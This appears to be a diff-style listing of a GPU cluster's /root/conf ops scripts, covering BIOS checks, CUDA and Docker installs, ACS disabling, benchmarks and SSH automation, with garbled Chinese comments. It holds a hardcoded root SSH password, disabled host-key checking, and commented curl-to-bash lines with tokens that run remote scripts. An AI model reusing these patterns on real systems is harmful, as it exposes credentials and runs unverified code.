-  if [[ $? -eq 0 && -n "$out" ]]; then
-    echo "$out" | sed "s/^/$ip,/" | awk -F, '{print $2","$1","$3}'
-  else
-    echo "ERROR,$ip,ERROR"
-  fi
-}
-export -f get_sn
-export KEY
-
-xargs -P "$JOBS" -I {} bash -c 'get_sn "{}"' < "$IPS" >> "$RESULT"
-echo "Done! ç»“æœè§ $RESULT"
-== /root/conf/bios.sh
-#!/bin/bash
-
-echo "Checking BIOS settings..."
-
-# è¶…çº¿ç¨‹æ£€æŸ¥
-echo -n "Hyper-Threading: "
-lscpu | grep "Thread(s) per core" | awk '{if ($4==1) print "Disabled (OK)"; else print "Enabled (Needs to be Disabled)"}'
-
-# VT æ£€æŸ¥
-echo -n "VT (Intel Virtualization Technology): "
-if grep -E "vmx|svm" /proc/cpuinfo > /dev/null; then
-    echo "Enabled (Needs to be Disabled)"
-else
-    echo "Disabled (OK)"
-fi
-
-# APIC æ£€æŸ¥
-echo -n "APIC: "
-if dmesg | grep -i apic > /dev/null; then
-    echo "Enabled (Needs to be Disabled)"
-else
-    echo "Disabled (OK)"
-fi
-
-# VT-d æ£€æŸ¥
-echo -n "VT-d (Intel VT for Directed I/O): "
-if dmesg | grep -e DMAR -e IOMMU > /dev/null; then
-    echo "Enabled (Needs to be Disabled)"
-else
-    echo "Disabled (OK)"
-== /root/conf/blacklist.conf
-# This file lists those modules which we don't want to be loaded by
-# alias expansion, usually so some other driver will be loaded for the
-# device instead.
-
-# evbug is a debug tool that should be loaded explicitly
-blacklist evbug
-
-# these drivers are very simple, the HID drivers are usually preferred
-blacklist usbmouse
-blacklist usbkbd
-
-# replaced by e100
-blacklist eepro100
-
-# replaced by tulip
-blacklist de4x5
-
-# causes no end of confusion by creating unexpected network interfaces
-blacklist eth1394
-
-# snd_intel8x0m can interfere with snd_intel8x0, doesn't seem to support much
-# hardware on its own (Ubuntu bug #2011, #6810)
-blacklist snd_intel8x0m
-
-# Conflicts with dvb driver (which is better for handling this device)
-blacklist snd_aw2
-
-# replaced by p54pci
-blacklist prism54
-
-== /root/conf/centos_softinstall.sh
-#!/bin/bash
-sudo yum clean all
-sudo yum makecache
-#åˆ¤æ–­æ˜¯å¦æœ‰æ¡Œé¢ç¯å¢ƒ
-yum grouplist | grep -E "GNOME|KDE|Xfce|Desktop"
-#æ˜¾ç¤ºGNOMEæ¡Œé¢çŠ¶æ€
-systemctl status gdm
-#åˆ¤æ–­åŸºæœ¬å›¾å½¢åº“æ˜¯å¦å®‰è£…äº†
-rpm -qa | grep -E "xorg-x11-server|wayland"
-#åˆ¤æ–­æ˜¯å¦å®‰è£…äº†å¼€å‘å·¥å…·å’Œåº“
-yum grouplist | grep -E "Development Tools|Compatibility Libraries"
-#å¦‚æœæ²¡æœ‰å®‰è£…æ¡Œé¢ï¼Œæ‰§è¡Œä»¥ä¸‹æ­¥éª¤
-yum -y groupinstall "GNOME Desktop"
-yum -y groupinstall "Development Tools"
-yum -y groupinstall "Compatibility Libraries"
-
-yum remove libvirt-daemon -y
-#å¦‚æœä¸€å¼€å§‹æ²¡æœ‰å®‰è£…NetworkManageråˆ™åœæ­¢æ‰ï¼Œå¦‚æœä¸€å¼€å§‹å°±æœ‰åˆ™ä¸ç”¨ç®¡ã€‚å’Œå¼€å§‹çŠ¶æ€ä¿æŒä¸€è‡´
-#systemctl disable NetworkManager 
-== /root/conf/change_hostname.sh
-#!/bin/bash
-apt-get install sshpass
-# å®šä¹‰ä¸»æœºä¿¡æ¯
-declare -A hosts=(
-  ["g0018"]="172.16.10.71"
-  ["g0019"]="172.16.10.72"
-  ["g0020"]="172.16.10.73"
-  ["g0021"]="172.16.10.74"
-  ["g0022"]="172.16.10.75"
-  ["g0023"]="172.16.10.76"
-  ["g0024"]="172.16.10.77"
-  ["g0025"]="172.16.10.78"
-)
-
-# SSHå¯†ç 
-PASSWORD="Beijingcs.2024"
-
-# éå†æ¯ä¸ªä¸»æœºå¹¶ä¿®æ”¹ä¸»æœºå
-for hostname in "${!hosts[@]}"; do
-  ip="${hosts[$hostname]}"
-  echo "æ­£åœ¨ä¿®æ”¹ä¸»æœº $hostname ($ip)"
-  
-  # ä½¿ç”¨ sshpass è¿›è¡Œè‡ªåŠ¨åŒ– SSH ç™»å½•
-  sshpass -p "$PASSWORD" ssh -o StrictHostKeyChecking=no root@$ip "hostnamectl set-hostname $hostname"
-  
-  if [ $? -eq 0 ]; then
-    echo "ä¸»æœº $hostname ($ip) ä¿®æ”¹æˆåŠŸ"
-  else
-    echo "ä¸»æœº $hostname ($ip) ä¿®æ”¹å¤±è´¥"
-  fi
-== /root/conf/check.sh
-#!/bin/bash
-
-# å®šä¹‰é¢œè‰²
-GREEN='\033[0;32m'
-RED='\033[0;31m'
-NC='\033[0m' # æ— é¢œè‰²
-
-# åˆå§‹åŒ–è®¡æ•°å™¨
-count_25000Mb=0
-count_400000Mb=0
-count_200000Mb=0
-count_50000Mb=0
-count_162=0
-count_106=0
-
-# éœ€è¦è¿›è¡Œé¢å¤–æµ‹è¯•çš„ç½‘å¡
-extra_test_netcards=()
-
-# æ­¥éª¤çŠ¶æ€å­˜å‚¨
-declare -A step_status
-step_status[1]="æœªé€šè¿‡"
-step_status[2]="æœªé€šè¿‡"
-step_status[3]="æœªé€šè¿‡"
-step_status[4]="æœªé€šè¿‡"
-step_status[5]="æœªé€šè¿‡"
-step_status[6]="æœªé€šè¿‡"
-step_status[7]="æœªé€šè¿‡"
-# åˆ é™¤æœ¬åœ°ç£ç›˜æŒ‚è½½æ£€æŸ¥
-# step_status[8]="æœªé€šè¿‡"
-step_status[8]="æœªé€šè¿‡"  # åˆ é™¤è¿™è¡Œ
-== /root/conf/check_nodes.sh
-#!/bin/bash
-#!/bin/bash
-
-# ä½¿ç”¨ mapfile å®‰å…¨è¯»å– hostlist4 çš„æ¯ä¸€è¡Œåˆ°æ•°ç»„ ips
-# -t è¡¨ç¤ºå»æ‰è¡Œå°¾æ¢è¡Œç¬¦
-mapfile -t ips < hostlist5
-
-# è·³è¿‡ç©ºè¡Œå’Œæ³¨é‡Šè¡Œï¼ˆå¯é€‰ï¼Œä½†æ¨èï¼‰
-filtered_ips=()
-for line in "${ips[@]}"; do
-  # å»é™¤é¦–å°¾ç©ºç™½
-  trimmed=$(echo "$line" | sed 's/^[[:space:]]*//;s/[[:space:]]*$//')
-  if [[ -n "$trimmed" && "$trimmed" != "#"* ]]; then
-    filtered_ips+=("$trimmed")
-  fi
-done
-ips=("${filtered_ips[@]}")
-
-# å­˜å‚¨å¼‚å¸¸èŠ‚ç‚¹
-declare -A failed_nodes
-
-echo "Testing connectivity to ${#ips[@]} nodes..."
-
-for ip in "${ips[@]}"; do
-  echo -n "Checking $ip ... "
-
-  # å°è¯• SSH å¹¶è·å– hostnameï¼Œè¶…æ—¶ 5 ç§’ï¼Œä¸äº¤äº’
-  if hostname=$(ssh -o ConnectTimeout=5 \
-                   -o BatchMode=yes \
-                   -o StrictHostKeyChecking=no \
-== /root/conf/chengdu_éƒ¨ç½²æ­¥éª¤.md
-# æˆéƒ½åˆ†åŒº(chengdu) Ubuntu 22.04 é›†ç¾¤éƒ¨ç½²æ­¥éª¤
-
-## å‰ç½®æ¡ä»¶
-- è¿œç¨‹æœºå™¨ï¼šUbuntu 22.04 ç³»ç»Ÿ
-- å·²ä¸Šä¼  `/root/conf` ç›®å½•ï¼ˆåŒ…å«æ‰€æœ‰è„šæœ¬æ–‡ä»¶ï¼‰
-- æœºå™¨æ‰€åœ¨åˆ†åŒºï¼š**chengdu**
-
----
-
-## ä¸€ã€ç™»å½•ä¿¡æ¯
-```
-å…¬ç½‘IPï¼šå¾…å¡«å†™
-è´¦å·ï¼šroot
-ç«¯å£ï¼š22
-å¯†ç ï¼šå¾…å¡«å†™
-```
-
----
-
-## äºŒã€éƒ¨ç½²æ­¥éª¤
-
-### æ­¥éª¤0ï¼šRAID10é…ç½®ï¼ˆå‰ç½®æ­¥éª¤ï¼‰
-
-> **è¯´æ˜**ï¼šæ­¤æ­¥éª¤åœ¨å®‰è£…é©±åŠ¨ä¹‹å‰æ‰§è¡Œï¼Œç”¨äºé…ç½®4å—NVMe SSDçš„RAID10é˜µåˆ—
-
-#### 0.1 ä¸Šä¼ confç›®å½•åˆ°è¿œç¨‹æœºå™¨
-
-**æœ¬åœ°Windowsç¯å¢ƒä½¿ç”¨pscpä¸Šä¼ ï¼š**
-```bash
-# ä½¿ç”¨PuTTYçš„pscpå·¥å…·
-== /root/conf/clean.sh
-#!/bin/bash
-#Cleaning anaconda envs
-# åˆ—å‡ºæ‰€æœ‰ç¯å¢ƒåç§°å¹¶æ’é™¤baseç¯å¢ƒå’Œå¸¦#å·çš„è¡Œï¼Œtail -n +3 æ’é™¤è¡¨å¤´è¡Œï¼Œä»ç¬¬ä¸‰è¡Œå¼€å§‹æ˜¾ç¤ºï¼Œç„¶åæ‰¹é‡åˆ é™¤
-for env in $(conda env list | grep -v 'base' | awk '{print $1}' | grep -v '#'); do
-  conda remove --name $env --all -y
-done
-echo "conda envs has been clean"
-#Cleaning up hidden dir and files
-find . -maxdepth 1 -type d -name ".*" ! -name ".ssh" -exec rm -rf {} \;
-find . -maxdepth 1 -type f -name ".*" ! -name ".ssh" -exec rm -rf {} \;
-cp /etc/skel/.* .
-#Cleaning up history records
-history -c
-== /root/conf/collect_gpu_diag.sh
-#!/bin/bash
-
-set -e
-
-NODE_NAME=$(hostname)
-TIMESTAMP=$(date +"%Y%m%d_%H%M%S")
-OUTPUT_DIR="gpu_diag_${NODE_NAME}_${TIMESTAMP}"
-
-mkdir -p "$OUTPUT_DIR"
-echo "ã€$(date)ã€‘å¼€å§‹æ”¶é›† GPU è¯Šæ–­ä¿¡æ¯"
-echo "â†’ è¾“å‡ºç›®å½•: $OUTPUT_DIR"
-
-# 1. è¿è¡Œ nvidia-bug-report.shï¼ˆä»…ç”¨èŠ‚ç‚¹åä½œä¸ºå‰ç¼€ï¼Œä¸åŠ  --safe-modeï¼‰
-echo "1. è¿è¡Œ sudo nvidia-bug-report.shï¼ˆè¾“å‡ºå«èŠ‚ç‚¹åï¼‰..."
-if command -v nvidia-bug-report.sh &> /dev/null; then
-    echo "   â†’ å¯èƒ½ä¼šæç¤ºè¾“å…¥ sudo å¯†ç ï¼Œè¯·è¾“å…¥..."
-    sudo nvidia-bug-report.sh --output-file "${NODE_NAME}"
-
-    # æŸ¥æ‰¾æœ€æ–°ç”Ÿæˆçš„ã€ä»¥ NODE_NAME å¼€å¤´çš„ .tar.gz æˆ– .tar.gz.gz æ–‡ä»¶
-    BUG_REPORT=$(ls -t "${NODE_NAME}"*.tar.gz* 2>/dev/null | head -n1)
-    if [[ -n "$BUG_REPORT" ]]; then
-        TARGET_FILE="$OUTPUT_DIR/$(basename "$BUG_REPORT")"
-        # å¦‚æœæ˜¯åŒ .gzï¼ˆå¦‚ xxx.tar.gz.gzï¼‰ï¼Œé‡å‘½åä¸ºæ ‡å‡† .tar.gz
-        if [[ "$BUG_REPORT" == *.tar.gz.gz ]]; then
-            mv "$BUG_REPORT" "$OUTPUT_DIR/${NODE_NAME}.tar.gz"
-            echo "  â†’ å·²ä¿å­˜å¹¶é‡å‘½å: $OUTPUT_DIR/${NODE_NAME}.tar.gz"
-        else
-            mv "$BUG_REPORT" "$OUTPUT_DIR/"
-            echo "  â†’ å·²ä¿å­˜: $TARGET_FILE"
-        fi
-== /root/conf/config
-Host *
-    StrictHostKeyChecking no
-    UserKnownHostsFile /dev/null
-== /root/conf/cpu_performance.sh
-#!/bin/bash
-
-# æ›´æ–°åŒ…åˆ—è¡¨å¹¶å®‰è£… cpufrequtils
-sudo apt-get update
-sudo apt-get install -y cpufrequtils
-
-# é…ç½® cpufrequtils è®¾ç½® GOVERNOR ä¸º "performance"
-sudo bash -c 'echo "GOVERNOR=\"performance\"" > /etc/default/cpufrequtils'
-
-# é‡å¯ cpufrequtils æœåŠ¡
-sudo /etc/init.d/cpufrequtils restart
-sudo bash -c 'echo "/etc/init.d/cpufrequtils restart" >> /etc/rc.local'
-
-
-# è¾“å‡ºå½“å‰çš„ CPU æ—¶é’Ÿé¢‘ç‡
-echo "Current CPU frequency:"
-cat /proc/cpuinfo | grep "MHz"
-
-# è¾“å‡ºå®Œæˆä¿¡æ¯
-echo "cpufrequtils has been installed, configured with GOVERNOR=\"performance\", and current CPU frequencies have been printed."
-== /root/conf/cpu_performance_centos.sh
-#!/bin/bash
-
-# æ›´æ–°åŒ…åˆ—è¡¨å¹¶å®‰è£… cpufrequtils
-#sudo apt-get update
-#sudo apt-get install -y cpufrequtils
-
-# é…ç½® cpufrequtils è®¾ç½® GOVERNOR ä¸º "performance"
-#sudo bash -c 'echo "GOVERNOR=\"performance\"" > /etc/default/cpufrequtils'
-
-# é‡å¯ cpufrequtils æœåŠ¡
-#sudo /etc/init.d/cpufrequtils restart
-#sudo bash -c 'echo "/etc/init.d/cpufrequtils restart" >> /etc/rc.local'
-
-
-# è¾“å‡ºå½“å‰çš„ CPU æ—¶é’Ÿé¢‘ç‡
-#echo "Current CPU frequency:"
-#cat /proc/cpuinfo | grep "MHz"
-
-# è¾“å‡ºå®Œæˆä¿¡æ¯
-#echo "cpufrequtils has been installed, configured with GOVERNOR=\"performance\", and current CPU frequencies have been printed."
-#!/bin/bash
-
-# æ›´æ–°è½¯ä»¶åŒ…å¹¶å®‰è£… cpupower
-sudo yum install -y kernel-tools
-
-# å¯ç”¨ cpupower
-sudo systemctl enable --now cpupower.service
-
-# è®¾ç½® CPU é¢‘ç‡è°ƒèŠ‚æ¨¡å¼ä¸º "performance"
-sudo cpupower frequency-set -g performance
-== /root/conf/cuda.sh
-#!/bin/bash
-SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
-PARENT_DIR="$(dirname "$SCRIPT_DIR")"
-echo "confä¸Šä¸€çº§ç›®å½•è·¯å¾„ä¸º:$PARENT_DIR"
-cuda_file=cuda_12.4.1_550.54.15_linux.run
-cuda_url=https://developer.download.nvidia.com/compute/cuda/12.8.1/local_installers/cuda_12.8.1_570.124.06_linux.run
-
-# åˆ¤æ–­CUDAå®‰è£…åŒ…æ˜¯å¦å­˜åœ¨ï¼Œä¸å­˜åœ¨åˆ™ä¸‹è½½
-if [ ! -f "$PARENT_DIR/$cuda_file" ]; then
-    echo "[INFO] CUDA installer not found, downloading..."
-    wget -c -P "$PARENT_DIR" "$cuda_url"
-    if [ $? -ne 0 ]; then
-        echo "[ERROR] Download failed, please check network or URL."
-        exit 1
-    fi
-else
-    echo "[INFO] CUDA installer already exists, skipping download."
-fi
-
-chmod +x "$PARENT_DIR/$cuda_file"
-mkdir -p /usr/local/cuda-12.4
-
-cuda_path=$PARENT_DIR
-CUDA_HOME=/usr/local/cuda-12.4
-
-$cuda_path/$cuda_file --toolkit --toolkitpath=${CUDA_HOME} --librarypath=${CUDA_HOME} --samples --samplespath=${CUDA_HOME} --tmpdir=/tmp --silent
-== /root/conf/deploy_fl_container.sh.sh
-#!/bin/bash
-set -e
-
-echo "[INFO] ğŸš€ éƒ¨ç½²æ”¯æŒ InfiniBand çš„è®­ç»ƒå®¹å™¨ 'fl'"
-
-# ========== é…ç½®åŒº ==========
-CONTAINER_NAME="fl"
-IMAGE_NAME="fl:0416"
-SSH_PORT=13666
-
-# æ•°æ®å·ï¼ˆè¯·ç¡®ä¿è·¯å¾„å­˜åœ¨ï¼‰
-VOL_UPLOAD="/upload/test"
-VOL_SHARED="/sharedata/"
-
-# IB é©±åŠ¨æ–‡ä»¶ï¼ˆUbuntu 22.04 æ ‡å‡†è·¯å¾„ï¼‰
-IB_VERBS_CONF="/etc/libibverbs.d"
-IB_LIBS=(
-    "/usr/lib/x86_64-linux-gnu/libibverbs.so.1"
-    "/usr/lib/x86_64-linux-gnu/libmlx5.so.1"
-    "/usr/lib/x86_64-linux-gnu/librdmacm.so.1"
-)
-# ========== é…ç½®ç»“æŸ ==========
-
-# æ£€æŸ¥å¿…è¦æ–‡ä»¶æ˜¯å¦å­˜åœ¨
-for lib in "${IB_LIBS[@]}"; do
-    if [[ ! -f "$lib" ]]; then
-        echo "[ERROR] ç¼ºå¤± IB åº“: $lib"
-        echo "è¯·åœ¨å®¿ä¸»æœºè¿è¡Œ: sudo apt-get install -y rdma-core librdmacm1"
-        exit 1
-    fi
-== /root/conf/disable_chaojubiain_acs.sh
-#!/bin/bash
-#
-# Copyright (c) 2018, NVIDIA CORPORATION.  All rights reserved.
-#
-# NVIDIA CORPORATION and its licensors retain all intellectual property
-# and proprietary rights in and to this software, related documentation
-# and any modifications thereto.  Any use, reproduction, disclosure or
-# distribution of this software and related documentation without an express
-# license agreement from NVIDIA CORPORATION is strictly prohibited.
-#
-
-# must be root to access extended PCI config space
-if [ "$EUID" -ne 0 ]; then
-  echo "ERROR: $0 must be run as root"
-  exit 1
-fi
-
-for BDF in `lspci -d "*:*:*" | awk '{print $1}'`; do
-
-    # skip if it doesn't support ACS
-    setpci -v -s ${BDF} ECAP_ACS+0x6.w > /dev/null 2>&1
-    if [ $? -ne 0 ]; then
-            #echo "${BDF} does not support ACS, skipping"
-            continue
-    fi
-
-    logger "Disabling ACS on `lspci -s ${BDF}`"
-    setpci -v -s ${BDF} ECAP_ACS+0x6.w=0000
-    if [ $? -ne 0 ]; then
-        logger "Error disabling ACS on ${BDF}"
-== /root/conf/disable_chaowei_acs.sh
-#!/bin/bash
-#
-# Copyright (c) 2018, NVIDIA CORPORATION.  All rights reserved.
-#
-# NVIDIA CORPORATION and its licensors retain all intellectual property
-# and proprietary rights in and to this software, related documentation
-# and any modifications thereto.  Any use, reproduction, disclosure or
-# distribution of this software and related documentation without an express
-# license agreement from NVIDIA CORPORATION is strictly prohibited.
-#
-
-# must be root to access extended PCI config space
-
-if [ "$EUID" -ne 0 ]; then
-  echo "ERROR: $0 must be run as root"
-  exit 1
-fi
-
-for BDF in `lspci -d "*:*:*" | awk '{print $1}'`; do
-
-    # skip if it doesn't support ACS
-    setpci -v -s ${BDF} ECAP_ACS+0x6.w > /dev/null 2>&1
-    if [ $? -ne 0 ]; then
-            echo "${BDF} does not support ACS, skipping"
-            continue
-    fi
-
-    logger "Disabling ACS on `lspci -s ${BDF}`"
-    setpci -v -s ${BDF} ECAP_ACS+0x6.w=0000
-    if [ $? -ne 0 ]; then
-== /root/conf/disable_ningchang_acs.sh
-#!/bin/bash
-#
-# Copyright (c) 2018, NVIDIA CORPORATION.  All rights reserved.
-#
-# NVIDIA CORPORATION and its licensors retain all intellectual property
-# and proprietary rights in and to this software, related documentation
-# and any modifications thereto.  Any use, reproduction, disclosure or
-# distribution of this software and related documentation without an express
-# license agreement from NVIDIA CORPORATION is strictly prohibited.
-#
-
-# must be root to access extended PCI config space
-if [ "$EUID" -ne 0 ]; then
-  echo "ERROR: $0 must be run as root"
-  exit 1
-fi
-
-for BDF in `lspci -d "*:*:*" | awk '{print $1}'`; do
-
-    # skip if it doesn't support ACS
-    setpci -v -s ${BDF} ECAP_ACS+0x6.w > /dev/null 2>&1
-    if [ $? -ne 0 ]; then
-            #echo "${BDF} does not support ACS, skipping"
-            continue
-    fi
-
-    logger "Disabling ACS on `lspci -s ${BDF}`"
-    setpci -v -s ${BDF} ECAP_ACS+0x6.w=0000
-    if [ $? -ne 0 ]; then
-        logger "Error disabling ACS on ${BDF}"
-== /root/conf/disablenouveau.sh
-#!/bin/bash
-conf_dir="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
-cp $conf_dir/blacklist.conf /etc/modprobe.d/
-#cp /boot/initrd.img-$(uname -r).img /boot/initrd.img-$(uname -r).img.bak1
-update-initramfs -k $(uname -r) -c
-== /root/conf/disableupdate.sh
-#!/bin/bash
-conf_dir="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
-rm -f /etc/apt/apt.conf.d/50unattended-upgrades
-cp $conf_dir/10periodic /etc/apt/apt.conf.d/10periodic
-cp $conf_dir/20auto-upgrades /etc/apt/apt.conf.d/20auto-upgrades
-cp $conf_dir/limits.conf /etc/security/limits.conf
-cp $conf_dir/nolinuxupgrades /etc/apt/preferences.d/nolinuxupgrades
-cp $conf_dir/nv_gpu_conf.sh /usr/local/bin
-for i in `dpkg -l | grep -E '^(ii|hi)\s+linux-(generic|headers|image|modules)' | awk '!/linux-(generic|headers-generic|image-generic)/ {print $2}' | grep 'generic$'`;do apt-mark hold $i;done
-apt update -y
-apt install lrzsz -y
-apt -y install nfs-kernel-server
-apt -y install nfs-common
-timedatectl set-timezone Asia/Shanghai
-apt install chrony -y
-systemctl start chrony
-systemctl enable chrony
-systemctl status chrony
-timedatectl
-chronyc tracking
-chronyc sources
-apt-get install openssh-client -y
-dpkg --get-selections | grep hold
-systemctl stop unattended-upgrades.service
-systemctl disable unattended-upgrades.service
-#zhengzhou B200
-#curl -kfsSL -g http://36.103.234.241:8000/api/agent/script | bash -s --  --installer_work_dir /tmp --token 0Mh4Ul2Olm3K0YCw
-#FOR 4090
-#curl -kfsSL -g http://100.127.255.2:8000/api/agent/script | bash -s --  --installer_work_dir /tmp --token 1LKfrrQMaoWoH5xL
-#FOR N72 A800
-== /root/conf/docker-install.yml
----
-- name: Install Docker with Aliyun Mirror
-  hosts: all
-  become: yes
-  tasks:
-    # 1. ä¿®å¤DNSé—®é¢˜ï¼ˆå¯é€‰ï¼‰
-    - name: Configure temporary DNS
-      shell: |
-        echo "nameserver 8.8.8.8" >> /etc/resolv.conf
-        echo "nameserver 114.114.114.114" >> /etc/resolv.conf
-      when: ansible_os_family == 'Debian'
-
-    # 2. å®‰è£…åŸºç¡€ä¾èµ–
-    - name: Install prerequisites
-      apt:
-        name: "{{ item }}"
-        state: present
-        update_cache: yes
-      loop:
-        - apt-transport-https
-        - ca-certificates
-        - curl
-        - gnupg
-        - lsb-release
-        - software-properties-common
-
-    # 3. æ·»åŠ é˜¿é‡Œäº‘Dockerå¯†é’¥ï¼ˆä½¿ç”¨apt-keyæ–¹å¼ï¼‰
-    - name: Add Docker GPG key via apt-key
-      shell: |
-        curl -fsSL http://mirrors.aliyun.com/docker-ce/linux/ubuntu/gpg | apt-key add -
-== /root/conf/docker.sh
-# æ›´æ–°ç³»ç»ŸåŒ…ç´¢å¼•
-sudo apt update && sudo apt upgrade -y
-
-# å®‰è£…è¯ä¹¦ã€curlã€gnupg ç­‰åŸºç¡€ä¾èµ–
-sudo apt install -y ca-certificates curl gnupg lsb-release
-# åˆ›å»ºå¯†é’¥å­˜å‚¨ç›®å½•
-sudo mkdir -p /etc/apt/trusted.gpg.d
-
-# å¯¼å…¥é˜¿é‡Œäº‘ Docker GPG å¯†é’¥ï¼ˆé¿å…ç­¾åéªŒè¯å¤±è´¥ï¼‰
-curl -fsSL https://mirrors.aliyun.com/docker-ce/linux/ubuntu/gpg | sudo gpg --dearmor -o /etc/apt/trusted.gpg.d/docker.gpg
-# æ·»åŠ é€‚é… Ubuntu 24.04ï¼ˆnobleï¼‰çš„é˜¿é‡Œäº‘ Docker æº
-echo "deb [arch=$(dpkg --print-architecture) signed-by=/etc/apt/trusted.gpg.d/docker.gpg] https://mirrors.aliyun.com/docker-ce/linux/ubuntu $(lsb_release -cs) stable" | sudo tee /etc/apt/sources.list.d/docker.list > /dev/null
-
-# å†æ¬¡æ›´æ–°åŒ…ç´¢å¼•ï¼ˆåŠ è½½æ–°æ·»åŠ çš„ Docker æºï¼‰
-sudo apt update
-# å®‰è£… Docker CEã€Containerdã€Docker Compose æ’ä»¶
-sudo apt install -y docker-ce docker-ce-cli containerd.io docker-buildx-plugin docker-compose-plugin
-# å¯åŠ¨ Docker æœåŠ¡
-sudo systemctl start docker
-
-# è®¾ç½®å¼€æœºè‡ªå¯
-sudo systemctl enable docker
-
-# éªŒè¯ Docker çŠ¶æ€ï¼ˆè¾“å‡º active (running) å³æ­£å¸¸ï¼‰
-sudo systemctl status docker
-
-== /root/conf/download_huggingfacemodel_B200_batch.sh
-#!/bin/bash
-export http_proxy=http://10.29.1.201:3128
-export https_proxy=http://10.29.1.201:3128
-
-DOWNLOAD_DIR="/ssd/models"
-mkdir -p "$DOWNLOAD_DIR"
-
-# æˆåŠŸå’Œå¤±è´¥è®¡æ•°å™¨
-success_count=0
-fail_count=0
-failed_models=()
-
-download_model() {
-    local url="$1"
-    local model_name="$2"
-    local filename=$(basename "$url")
-    
-    # å¤„ç†åŒ…å«æŸ¥è¯¢å‚æ•°çš„URL
-    if [[ "$filename" == *"?"* ]]; then
-        filename=$(echo "$filename" | cut -d'?' -f1)
-    fi
-    
-    echo "í ½íº€ å¼€å§‹ä¸‹è½½: $model_name"
-    echo "í ½í³ æ–‡ä»¶: $filename"
-    echo "í ½í´— URL: $url"
-    echo "---"
-    
-    # ä¿®å¤ï¼šç¡®ä¿ aria2c å‘½ä»¤åœ¨ä¸€è¡Œå†…å®Œæ•´æ‰§è¡Œ
-    aria2c --all-proxy="$http_proxy" --dir="$DOWNLOAD_DIR" --out="$filename" --max-tries=5 --retry-wait=10 --timeout=60 --max-connection-per-server=16 --split=16 --continue=true --check-certificate=false --summary-interval=30 "$url"
-    
-== /root/conf/elbencho-storage-test.sh
-#!/usr/bin/env bash
-
-TESTDIR=/mnt/testdir
-RESFILE=b.log
-HOSTS=g0002,g0004,g0005,g0008,g0009,g0010,g0011,g0014
-THREADS=64
-SIZE=2g
-IODEPTH=1
-TIMELIMIT=60
-
-set -x
-
-mkdir -p $TESTDIR
-echo $HOSTS |tr , '\n' |xargs -I{} ssh {} $TESTDIR/elbencho --service
-sleep 5
-
-$TESTDIR/elbencho --hosts $HOSTS -w -n 0 -t $THREADS -s $SIZE -b 4m --direct --resfile $RESFILE $TESTDIR
-$TESTDIR/elbencho --hosts $HOSTS -r -n 0 -t $THREADS -s $SIZE -b 4m --direct --resfile $RESFILE $TESTDIR
-
-$TESTDIR/elbencho --hosts $HOSTS -w -n 0 -t $THREADS -s $SIZE -b 4k --direct --iodepth $IODEPTH --rand --timelimit $TIMELIMIT --resfile $RESFILE $TESTDIR
-$TESTDIR/elbencho --hosts $HOSTS -r -n 0 -t $THREADS -s $SIZE -b 4k --direct --iodepth $IODEPTH --rand --timelimit $TIMELIMIT --resfile $RESFILE $TESTDIR
-
-$TESTDIR/elbencho --hosts $HOSTS -w -n 0 -s $SIZE -b 4k --direct --lat --timelimit $TIMELIMIT --resfile $RESFILE $TESTDIR
-$TESTDIR/elbencho --hosts $HOSTS -r -n 0 -s $SIZE -b 4k --direct --lat --timelimit $TIMELIMIT --resfile $RESFILE $TESTDIR
-
-#/ssc/benchmark/elbencho --hosts $HOSTS -F -n 0 -t $THREADS $TESTDIR
-#/ssc/benchmark/elbencho --hosts $HOSTS --quit
-== /root/conf/env.sh
-# fio v3.28
-export FIO_HOME=/opt/fio
-export PATH=${FIO_HOME}/bin:$PATH
-
-# iperf v2.1.5
-export IPERF_HOME=/opt/iperf
-export PATH=${IPERF_HOME}/bin:$PATH
-
-# qperf v0.4.11
-export QPERF_HOME=/opt/qperf
-export PATH=${QPERF_HOME}/bin:$PATH
-
-# stress-ng v0.13.12
-export STRESSNG_HOME=/opt/stress-ng/usr
-export PATH=${STRESSNG_HOME}/bin:$PATH
-
-# sysbench v1.0.20
-export SYSBENCH_HOME=/opt/sysbench
-export PATH=${SYSBENCH_HOME}/bin:$PATH
-
-# cuda v12.4
-export CUDA_HOME=/opt/cuda
-export PATH=${CUDA_HOME}/bin:$PATH
-export LD_LIBRARY_PATH=${CUDA_HOME}/lib64:${CUDA_HOME}/lib64/stubs:$LD_LIBRARY_PATH
-export LIBRARY_PATH=${CUDA_HOME}/lib64:${CUDA_HOME}/lib64/stubs:$LIBRARY_PATH
-export CPATH=${CUDA_HOME}/include:$CPATH
-
-# nccl v2.20.3-1
-export NCCL_HOME=/opt/nccl/build
-export LD_LIBRARY_PATH=${NCCL_HOME}/lib:$LD_LIBRARY_PATH
-== /root/conf/fio-parallel.sh
-#!/bin/bash
-
-# å®šä¹‰å®¢æˆ·ç«¯èŠ‚ç‚¹åˆ—è¡¨
-CLIENT_NODES=("g0002" "g0004" "g0005" "g0008" "g0009" "g0010")
-
-# é€šç”¨å‚æ•°
-FILENAME="/mnt/IO-test/test.file"
-SIZE="10G"
-IODEPTH=16
-DIRECT=1
-RUNTIME=240
-IOENGINE="sync"
-GROUP_REPORTING="--group_reporting"
-NAME="test"
-
-# å—å¤§å°æ•°ç»„
-BLOCK_SIZES=("4M" "1M" "4K")
-# å¹¶å‘ä»»åŠ¡æ•°æ•°ç»„
-NUMJOBS_VALUES=(16 32 64 128)
-# I/Oæ¨¡å¼æ•°ç»„
-RW_MODES=("write" "read" "rw" "randread" "randwrite" "randrw")
-
-# è¾“å‡ºæ–‡ä»¶
-OUTPUT_FILE="fio_distributed_results.log"
-
-# æ¸…ç©ºè¾“å‡ºæ–‡ä»¶ï¼ˆå¦‚æœå­˜åœ¨çš„è¯ï¼‰
-> $OUTPUT_FILE
-
-# å¾ªç¯æ¯ç§å—å¤§å°
-for BS in "${BLOCK_SIZES[@]}"; do
-== /root/conf/fio-single.sh
-#!/bin/bash
-dd if=/dev/zero of=/mnt/IO-test/test.file bs=1M count=1024000
-# é€šç”¨å‚æ•°
-FILENAME="/mnt/IO-test/test.file"
-SIZE="10G"
-IODEPTH=16
-DIRECT=1
-RUNTIME=240
-IOENGINE="sync"
-GROUP_REPORTING="--group_reporting"
-NAME="test"
-
-# å—å¤§å°æ•°ç»„
-BLOCK_SIZES=("4M" "1M" "4K")
-# å¹¶å‘ä»»åŠ¡æ•°æ•°ç»„
-NUMJOBS_VALUES=(16 32 64 128)
-# I/Oæ¨¡å¼æ•°ç»„
